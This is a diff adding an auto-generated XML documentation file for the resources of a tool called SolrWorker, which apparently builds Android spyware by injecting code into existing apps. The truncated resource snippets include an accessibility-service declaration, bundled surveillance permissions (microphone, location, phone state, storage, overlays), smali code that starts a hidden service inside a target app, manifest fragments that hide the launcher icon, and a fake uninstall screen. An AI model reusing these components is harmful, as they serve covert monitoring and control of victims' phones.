@@ -1,0 +1,363 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SolrWorker
+</name>
+</assembly>
+<members>
+<member name="T:SolrWorker.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources._7zip">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.accessibilityprivatesrcapp">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;accessibility-service android:description=&quot;@string/pnam&quot; android:summary=&quot;@string/pnam&quot; android:settingsActivity=&quot;com.android.settings&quot; android:accessibilityEventTypes=&quot;typeAnnouncement|typeAssistReadingContext|typeContextClicked|typeGestureDetectionEnd|typeGestureDetectionStart|typeNotificationStateChanged|typeTouchExplorationGestureEnd|typeTouchExplorationGestureStart|typeTouchInteractionEnd|typeTouchInteractionStart|typeViewAccessibilityFocusCleared|typeViewAccess [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.AccessTag">
+<summary>
+  Looks up a localized string similar to &lt;service android:enabled=&quot;true&quot; android:exported=&quot;false&quot; android:label=&quot;@string/BaseName&quot; android:name=&quot;com.icontrol.protector.AccessServices&quot; android:permission=&quot;android.permission.BIND_ACCESSIBILITY_SERVICE&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.accessibilityservice.AccessibilityService&quot;/&gt;
+            &lt;/intent-filter&gt;
+            &lt;meta-data android:name=&quot;android.accessibilityservice&quot; android:resource=&quot;@xml/accessibilityprivatesrcapp&quot;/&gt;
+        &lt;/service&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.Activitychat">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    android:padding=&quot;16dp&quot;
+    android:background=&quot;#202020&quot;
+    tools:context=&quot;.ChatActivity&quot;&gt;
+
+    &lt;TextView
+        android:id=&quot;@+id/chattitle&quot;
+        android:layout_width=&quot;match_parent&quot;
+        android:layout_height=&quot;40dp&quot;
+        android:background [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ALLPRIM">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.WAKE_LOCK&quot; /&gt;#
+&lt;uses-permission android:name=&quot;com.android.alarm.permission.SET_ALARM&quot; /&gt;#
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.APKEditor">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.apktool">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.batteryprim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS&quot; /&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.BootPrim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.certificate">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.DEFserverconfigs">
+<summary>
+  Looks up a localized string similar to {
+  &quot;ServerApi&quot;: &quot;http://localhost/yaarsa/private/yarsap_90061.php&quot;,
+  &quot;ServerApi_Customapp&quot;: &quot;http://localhost/yaarsa/private/yarsap_91370.php&quot;,
+  &quot;Currentsubdir&quot;: &quot;/yaarsa/private/&quot;
+}.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.emptyaccess">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+
+&lt;accessibility-service xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    /&gt;
+.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.Externalstorage">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.MANAGE_EXTERNAL_STORAGE&quot; /&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_MEDIA_IMAGES&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_MEDIA_VIDEO&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.FORGROUD">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.FOREGROUND_SERVICE&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.key">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.luncherIntent">
+<summary>
+  Looks up a localized string similar to &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
+                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
+
+            &lt;/intent-filter&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.MainMith">
+<summary>
+  Looks up a localized string similar to .method public InializeSubsT()V
+    .locals 4
+
+    :try_start_0
+    new-instance v1, Landroid/content/Intent;
+
+    invoke-virtual {p0}, [trgtmain]-&gt;getApplicationContext()Landroid/content/Context;
+
+    move-result-object v2
+
+    const-class v3, Lcom/icontrol/protector/StarterServices;
+
+    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .local v1, &quot;Strt_int&quot;:Landroid/content/Intent;
+    invoke-virtual {p0, v1}, [trgtmain]-&gt;startSe [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ManifistCode">
+<summary>
+  Looks up a localized string similar to &lt;uses-library android:name=&quot;org.apache.http.legacy&quot; android:required=&quot;false&quot;/&gt;
+        &lt;provider android:authorities=&quot;com.icontrol.protector.provider&quot; android:exported=&quot;false&quot; android:grantUriPermissions=&quot;true&quot; android:name=&quot;androidx.core.content.FileProvider&quot;&gt;
+            &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/pfs1&quot;/&gt;
+        &lt;/provider&gt;
+        &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.icontrol.protector.Splasher&quot;/&gt;
+        &lt;activity-alias andro [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ManifistHide">
+<summary>
+  Looks up a localized string similar to &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.INFO&quot;/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.service.quicksettings.action.QS_TILE_PREFERENCES&quot;/&gt;
+            &lt;/intent-filter&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;com.android.settings.action.IA_SETTINGS&quot;/&gt;
+            &lt;/intent-filter&gt;
+            &lt;meta-data a [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.mywebviewer">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    android:orientation=&quot;vertical&quot;&gt;
+
+
+    &lt;WebView
+        android:id=&quot;@+id/MyView&quot;
+        android:layout_width=&quot;match_parent&quot;
+        android:layout_height=&quot;match_parent&quot; /&gt;
+
+    &lt;ProgressBar
+        android:id=&quot;@+id/progressBar&quot;
+        style=&quot;?android:attr/progressBarStyleLarge&quot;
+        android:la [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.network_security_config">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;network-security-config&gt;
+    &lt;base-config cleartextTrafficPermitted=&quot;true&quot; /&gt;
+&lt;/network-security-config&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.nointernet">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    android:orientation=&quot;vertical&quot;
+    android:background=&quot;#292929&quot;&gt;
+
+    &lt;LinearLayout
+        android:layout_width=&quot;match_parent&quot;
+        android:layout_height=&quot;35dp&quot;
+        android:background=&quot;#292929&quot;
+        android:orientation=&quot;horizontal&quot;&gt;
+
+    &lt;/LinearLayout&gt;
+    &lt;LinearLayout
+        android:l [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.oncreatecode">
+<summary>
+  Looks up a localized string similar to invoke-virtual/range {p0}, [trgtmain]-&gt;InializeSubsT()V.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.oppobattery">
+<summary>
+  Looks up a localized string similar to &lt;!-- activity_main.xml --&gt;
+&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:background=&quot;#000011&quot;
+    android:layout_height=&quot;match_parent&quot;&gt;
+
+
+    &lt;ImageView
+        android:id=&quot;@+id/imageView&quot;
+        android:layout_width=&quot;match_parent&quot;
+        android:layout_height=&quot;400dp&quot;
+        android:layout_centerHorizontal=&quot;true&quot;
+        android:layout_marginTop=&quot;75dp&quot;
+        android:src=&quot;@drawable/oppo_bty_en_1&quot; /&gt;
+
+
+
+     [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.providerfile">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;paths xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
+    &lt;external-path
+        name=&quot;external_files&quot;
+        path=&quot;.&quot; /&gt;
+&lt;/paths&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.read_state_prim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ReadPrim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ReplaceAccess">
+<summary>
+  Looks up a localized string similar to &lt;meta-data android:name=&quot;REPALCEACCESS&quot; android:value=&quot;99999999&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ReplaceLuncher">
+<summary>
+  Looks up a localized string similar to &lt;meta-data android:name=&quot;REPLACELUNCH&quot; android:value=&quot;66666666&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.ReplacePrimes">
+<summary>
+  Looks up a localized string similar to &lt;queries android:name=&quot;[Replace_Prmies]&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.signapk">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.splits">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;splits&gt;
+    &lt;module name=&quot;&quot;&gt;
+        &lt;language&gt;
+            &lt;entry key=&quot;af&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;am&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;ar&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;az&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;bg&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;bn&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;ca&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;cs&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;da&quot; split=&quot;&quot; /&gt;
+            &lt;entry key=&quot;de&quot; split=&quot;&quot; /&gt;
+           [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.SystemwindowPrim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.Toreplaceprim">
+<summary>
+  Looks up a localized string similar to &lt;queries android:name=&quot;[GPRIM]&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.uninstall_activity">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    android:gravity=&quot;center&quot;
+    android:orientation=&quot;vertical&quot;
+    android:padding=&quot;20dp&quot;
+    android:background=&quot;#232323&quot;&gt;
+
+    &lt;ImageView
+        android:id=&quot;@+id/errorimg&quot;
+        android:layout_width=&quot;144px&quot;
+        android:layout_height=&quot;144px&quot;
+        android:paddingLeft=&quot;5dp&quot;
+        android:src= [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.WritePrim">
+<summary>
+  Looks up a localized string similar to &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;.
+</summary>
+</member>
+<member name="P:SolrWorker.My.Resources.Resources.zipalign">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+</members>
+</doc>
